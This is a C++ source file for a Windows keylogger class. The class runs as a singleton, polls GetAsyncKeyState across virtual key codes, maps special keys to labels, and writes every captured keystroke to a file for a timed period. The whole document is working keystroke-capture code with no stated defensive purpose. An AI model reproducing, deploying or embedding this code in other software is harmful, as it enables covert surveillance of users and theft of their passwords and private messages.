#include "keylogger.h"

KeyLogger* KeyLogger::instance = nullptr;

KeyLogger* KeyLogger::getInstance(const string& file_name) {
	if (!instance) instance = new KeyLogger(file_name);
	return instance;
}
void KeyLogger::deleteInstance() {
	if (instance) {
		delete instance;
		instance = nullptr;
	}
}


unordered_map<int, string> KeyLogger::vkey = {
			{VK_TAB, "[ TAB ]"},
			{VK_RETURN, "[ ENTER ]"},
			{VK_BACK, "[ BACKSPACE ]"},
			{VK_SHIFT, ""},
			{VK_LSHIFT, "[ LSHIFT ]"},
			{VK_RSHIFT, "[ RSHIFT ]"},
			{VK_CAPITAL, "[ CAPS_LOCK ]"},
			{VK_CONTROL, ""},
			{VK_LCONTROL, "[ LCTRL ]"},
			{VK_RCONTROL, "[ RCTRL ]"},
			{VK_MENU, ""},
			{VK_LMENU, "[ LALT ]"},
			{VK_RMENU, "[ RALT ]"},
			{VK_LWIN, "[ LWINDOWS ]"},
			{VK_RWIN, "[ RWINDOWS ]"},
			{VK_SPACE, " "},
			{VK_UP, "[ UP ]"},
			{VK_DOWN, "[ DOWN ]"},
			{VK_LEFT, "[ LEFT ]"},
			{VK_RIGHT, "[ RIGHT ]"},
			{VK_DELETE, "[ DELETE ]"},
			{VK_ESCAPE, "[ ESC ]"},
			{VK_OEM_PLUS, "[ =+ ]"},
			{VK_OEM_MINUS, "[ -_ ]"},
			{VK_OEM_PERIOD, "[ .> ]"},
			{VK_OEM_COMMA, "[ ,< ]"},
			{VK_OEM_1, "[ ;: ]"},
			{VK_OEM_2, "[ /? ]"},
			{VK_OEM_3, "[ `~ ]"},
			{VK_OEM_4, "[ [{ ]"},
			{VK_OEM_5, "[ \\| ]"},
			{VK_OEM_6, "[ ]} ]" },
			{VK_OEM_7, "[ \'\" ]"},
			{VK_NUMPAD0, "[ NUMPAD_0 ]"},
			{VK_NUMPAD1, "[ NUMPAD_1 ]"},
			{VK_NUMPAD2, "[ NUMPAD_2 ]"},
			{VK_NUMPAD3, "[ NUMPAD_3 ]"},
			{VK_NUMPAD4, "[ NUMPAD_4 ]"},
			{VK_NUMPAD5, "[ NUMPAD_5 ]"},
			{VK_NUMPAD6, "[ NUMPAD_6 ]"},
			{VK_NUMPAD7, "[ NUMPAD_7 ]"},
			{VK_NUMPAD8, "[ NUMPAD_8 ]"},
			{VK_NUMPAD9, "[ NUMPAD_9 ]"},
			{VK_MULTIPLY, "*"},
			{VK_ADD, "+"},
			{VK_SUBTRACT, "-"},
			{VK_DIVIDE, "/"},
			{VK_DECIMAL, "."},
			{VK_PRIOR, "[ PAGE_UP ]"},
			{VK_NEXT, "[ PAGE_DOWN ]"},
			{VK_END, "[ END ]"},
			{VK_HOME, "[ HOME ]"},
			{VK_INSERT, "[ INSERT ]"}
};

bool KeyLogger::getSpecialKey(int key, string& key_name) {
	if (vkey.find(key) == vkey.end()) return false;
	key_name = vkey[key];
	return true;
}

void KeyLogger::keylog() {
	ofstream fout (file_name);
	if (!fout.good()) {
		status = 1;
		return;
	}

	int key;
	string key_name;
	status = KL_RUNNING;
	// clear keystroke recorded before
	for (key = 0x08; key <= 0xE2; key++) {
		GetAsyncKeyState(key);
	}

	int end_time = time(0) + max_running_time;
	while (running && time(0) < end_time) {
		for (key = 0x08; key <= 0xE2; key++) {
			if (GetAsyncKeyState(key) & KL_PRESSED) {
				if (getSpecialKey(key, key_name)) {
					fout << key_name;
				}
				else if (0x30 <= key && key <= 0x5A) {
					fout << char(key);
				}
			}
		}
	}

	fout.close();
	status = KL_FINISHED;
}

string KeyLogger::getOutputFile() {
	return file_name;
}

int KeyLogger::getStatus() {
	return status;
}